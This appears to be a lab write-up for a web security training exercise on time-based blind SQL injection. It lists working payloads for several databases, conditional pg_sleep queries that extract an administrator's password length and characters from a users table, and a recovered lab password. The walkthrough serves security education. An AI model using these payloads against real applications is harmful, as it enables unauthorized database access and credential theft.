# Lab: Blind SQL injection with time delays and information retrieval
- lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie
- The database contains a different table called users, with columns called username and password
# Goal
- The database contains a different table called users, with columns called username and password
# Solving The Lab
- first thing is to check if the parameter is vulnurable we do that by checking with differnt db time delay function
```
' || (dbms_pipe.receive_message(('a'),10))--   Oracle
' || (WAITFOR DELAY '0:0:10')--                microsoft
' || (SELECT pg_sleep(10))--                   PostgreSQL
' || (SELECT SLEEP(10))--                      MySQL
```
- and the response is delayd on the third one so its postgresql
- now we have to build a query to make it for test like this
```
' || (select case when (1=0) then pg_sleep(10) else pg_sleep(0) end)--        No Delay
' || (select case when (1=1) then pg_sleep(10) else pg_sleep(0) end)--        Delay
```
- now check for users like administrator
```
' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
```
- after we have done the previous steps we need to Enumerate the password length
```
' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(0) end from users)--
```
- we got dealy at one now automate the process using the intruder like rana khalil video
- and we got the lenght ofthe password which is 20
- lets go to enumrating the password itself
```
' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(0) end from users)--
```
- and automating the process using intruder we got the password
```
rkvoycn67djs58p4ni12
```
